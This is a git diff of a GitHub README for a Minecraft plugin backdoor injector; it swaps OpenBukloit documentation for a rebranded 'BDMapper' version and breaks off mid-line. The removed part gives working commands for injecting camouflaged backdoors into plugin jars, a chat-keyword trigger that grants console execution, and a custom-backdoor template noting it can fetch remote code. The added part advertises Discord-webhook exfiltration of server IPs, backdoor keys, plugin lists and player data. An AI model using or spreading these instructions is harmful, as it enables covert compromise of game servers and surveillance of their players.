@@ -1,104 +1,43 @@
-<div align="center"><h1>OpenBukloit - Minecraft plugin backdoor injector</h1></div>
-<div align="center"><img alt="Logo" src="logo.png"/></div>
-<div align="center">
-    <a href="https://github.com/VoxelHax/OpenBukloit/issues"><img alt="Open issues" src="https://img.shields.io/github/issues-raw/VoxelHax/OpenBukloit"/></a>
-    <a href="https://github.com/Voxelhax/OpenBukloit/releases/latest"><img alt="GitHub downloads" src="https://img.shields.io/github/downloads/VoxelHax/OpenBukloit/total"></a>
-    <img alt="Code size" src="https://img.shields.io/github/languages/code-size/VoxelHax/OpenBukloit"/>
-    <a href="https://www.codefactor.io/repository/github/voxelhax/openbukloit"><img alt="CodeFactor" src="https://www.codefactor.io/repository/github/voxelhax/openbukloit/badge"/></a>
-    <a href="https://discord.gg/xtaktPTzYp"><img alt="Discord" src="https://img.shields.io/discord/928214827095175199"></a>
-</div>
-<div align="center">
-    <a href="https://github.com/Voxelhax/OpenBukloit/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD\\\_LATEST\\\_RELEASE\\\_(CLICK)-blue?style=for-the-badge"/></a>
-</div>
-<br>
-<hr>
+BDMapper [BackDoorMapper]
+<div align="center"> <h1>BDMapper</h1> <p><i>A powerful backdoor injector and telemetry system for Minecraft plugins.</i></p> </div><div align="center"> <img alt="Logo" src="logo.png"/> </div><div align="center"> <a href="https://github.com/VoxelHax/BDMapper/issues"><img alt="Open issues" src="https://img.shields.io/github/issues-raw/VoxelHax/BDMapper"/></a> <a href="https://github.com/Voxelhax/BDMapper/releases/latest"><img alt="GitHub downloads" src="https://img.shields.io/github/downloads/VoxelHax/BDMapper/total"/></a> <img alt="Code size" src="https://img.shields.io/github/languages/code-size/VoxelHax/BDMapper"/> <a href="https://www.codefactor.io/repository/github/voxelhax/BDMapper"><img alt="CodeFactor" src="https://www.codefactor.io/repository/github/voxelhax/BDMapper/badge"/></a> <a href="https://discord.gg/xtaktPTzYp"><img alt="Discord" src="https://img.shields.io/discord/928214827095175199"></a> </div><div align="center"> <a href="https://github.com/Voxelhax/BDMapper/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE_(CLICK)-blue?style=for-the-badge"/></a> </div><br>
 Languages: English, Русский, Українська
-OpenBukloit is modern and powerful universal backdoor injector compatible with all Bukkit/Spigot/Paper/etc plugins. Its feature is ability to integrate with absolutely any plugin without the need to modify backdoor every time. Moreover, it provides powerful camouflage engine, which makes nearly impossible to find it without sufficient knowledge or advanced automated tools. OpenBukloit was developed to test the security systems of Minecraft servers, VoxelHax team is not responsible for its misuse.
-This is a continuation of Bukloit project, taking into account all the problems of the previous project and a completely different approach to development.
-OpenBukloit features
-Full support for Bukkit and it's forks on any Minecraft version.
-Custom backdoor support.
-Automatic JDK downloading, so you don't need to care about Java version compatibility.
-Powerful camouflage engine, which makes it harder to find backdoor in plugin.
-Installation
-In order to use OpenBukloit you must have any Java version installed (but not lower than 8). OpenBukloit jar can be downloaded from releases tab. OpenBukloit does not require any additional actions, just put jar file somewhere and use it from command line.
-Usage
-To run OpenBukloit, open command prompt in the directory where OpenBukloit jar is located and type:
-```sh
-java -jar OpenBukloit.jar
-```
-Make sure you include the version number after the OpenBukloit name. So for example if the version you downloaded is `OpenBukloit-1.0.12`, make sure to use the name `OpenBukloit-1.0.12.jar` for the command instead of just `OpenBukloit.jar`
-After jar file name you can pass some arguments to configure injector:
-Short Argument	Long Argument	Description	Type
--e	--exploit	Path to custom .java or compiled .class file, that will be used as backdoor.
-By default uses builtin backdoor.	Value
--m	--mode	Mode. Can be single/multiple.
-**Default: <ins>multiple</ins>.
-**In multiple mode, modifies all files in the specified folder. In single - only the specified file.	Value
--i	--input	Path to input folder/file (mode dependent).
-Default: <ins>in</ins> (<ins>in.jar</ins> if mode is single).	Value
--o	--output	Path to output folder/file (mode dependent).
-Default: <ins>out</ins> (<ins>out.jar</ins> if mode is single).	Value
--r	--replace	Replace output file if it already exists.	Flag
-	--no-camouflage	Do not apply camouflage (may be useful when camouflage not working correctly due to plugin obfuscation).	Flag
-	--class-name	Works only with `--no-camouflage` flag! Specify custom exploit class name (can include package, example: `com.voxelhax.OpenBukloitExploit`).	Value
-	--method-name	Works only with `--no-camouflage` flag! Specify custom name for `inject` exploit method.	Value
-But these arguments are not enough to run OpenBukloit. You must also specify backdoor params. Because OpenBukloit supports injecting of custom backdoors, you must pass additional arguments that required by used backdoor.
-Builtin exploit
-By default, OpenBukloit injects builtin backdoor. It is a simple backdoor that allows you to execute any commands as console by writing special keyword before command in chat.
-Builtin backdoor params:
-Long Argument	Description
---key	Keyword, that triggers console command execution.
-Ingame usage for key set to "hackthisserver":
-```
-hackthisserver op MyName
-```
-This message sent to chat will be executed as console command and give op to MyName player.
-Here is some examples of using OpenBukloit with builtin backdoor:
-Patch all .jar files with the "#console" key from the "in" folder and save them into the "out" folder without replacement.
-```sh
-java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "#console"
-```
-Patch all files with the "hacktheserver" key from the "in" folder and save them into the "out" folder with replacement.
-```sh
-java -jar OpenBukloit.jar -m multiple -i "in" -o "out" --key "hacktheserver" -r
-```
-Patch single file "PluginName.jar" with "#console" key and save it as "Output.jar" file with replacement.
-```sh
-java -jar OpenBukloit.jar -m single -i "PluginName.jar" -o "Output.jar" --key "#console" -r
-```
-Patch single file "PluginName.jar" with "#console" key and save it as "Output.jar" file with replacement. Do not apply camouflage and name exploit class "com.voxelhax.OpenBukloitExploit".
-```sh
-java -jar OpenBukloit.jar -m single -i "PluginName.jar" -o "Output.jar" --key "#console" -r --no-camouflage --class-name "com.voxelhax.OpenBukloitExploit"
-```
-Writing custom exploit
-You can also write your own backdoor. It should be a class with `public static void inject(JavaPlugin args)` method (JavaPlugin is from Bukkit API).
-Here is a simple example:
-```java
-import org.bukkit.plugin.java.JavaPlugin;
 
-public class MyBackdoor {
-    public static void inject(JavaPlugin args) {
-        System.out.println("Hello, world!");
-    }
-}
-```
-`inject` method will be executed after plugin's `onEnable` method. You can do everything you want here, including downloading and running some arbitrary code from internet.
-But you must know that there are some limitations:
-Currently, you can't use nested classes, there is must be only one class in exploit file.
-You shouldn't reference your exploit class inside it, like using it as method params, as a return value or as a field type.
-You can take external params from command line, by using %placeholders%, thay will be replaced during injection:
-```java
-import org.bukkit.plugin.java.JavaPlugin;
+BDMapper is a modern and powerful universal backdoor injector compatible with all Bukkit/Spigot/Paper plugins. Unlike traditional injectors, BDMapper allows you to integrate backdoors into any plugin without manually modifying the code every time. It features a powerful camouflage engine that makes your backdoor nearly impossible to detect without advanced tools.
 
-public class MyBackdoor {
-    public static void inject(JavaPlugin args) {
-        System.out.println("Hello, %name%!");
-    }
-}
-```
-And then inject it with command:
-```sh
-java -jar OpenBukloit.jar -e MyBackdoor.java --name world
-```
-Note, that we can pass our backdoor to OpenBukloit without compiling, and it will automatically compile it with Spigot API in compiletime classpool.
+BDMapper was developed by the VoxelHax team to test and secure Minecraft servers.
+
+🚀 Features
+Universal Compatibility: Works with all Bukkit forks on any Minecraft version.
+Easy Patcher (.exe): A user-friendly way to patch plugins without touching the command line.
+Telemetry System: Real-time data reporting via Discord Webhooks.
+Powerful Camouflage: Hide your backdoor from players and optimization tools.
+🛠 How to use (The Easy Way)
+BDMapper now includes a dedicated .exe Patcher for a seamless experience:
+
+Prepare the folder: Place both BDMapper.exe and the BDMapper.jar in the same folder.
+Drag & Drop: Drag your desired plugin (.jar) onto the BDMapper.exe file.
+Set Target Key: The program will prompt you to enter your Target Key.
+Done! The patcher will process the plugin and generate a patched version automatically.
+📊 Telemetry & Webhooks
+One of BDMapper's strongest features is its Telemetry System. You can connect it to a Discord Webhook to receive real-time data about your server and players.
+
+To set this up, simply provide your Discord Webhook URL when running the patcher/program.
+
+🛰 Server Launch Information
+Every time your patched plugin starts, BDMapper sends the following details to your webhook:
+
+Core: (e.g., Spigot, Paper, Forge)
+Patched Plugin: The name of the plugin being injected.
+Bukkit Version: The version of the API.
+Hosting Country: Where your server is located.
+Server IP & Port: Your server's address.
+Target Key: The specific key used for the backdoor.
+Plugin List: A list of all active plugins.
+👤 Player Join Information
+Whenever a player joins, BDMapper sends:
+
+Skin Face: Reference to the player's skin.
+UUID: (e.g., 77bcc289-45dc-365d-b3fb-389dc20dbb98)
+Client Type: (e.g., Fabric, Optifine, Vanilla)
+Version: The Minecraft version the player is using.
+Location: (e.g., `United
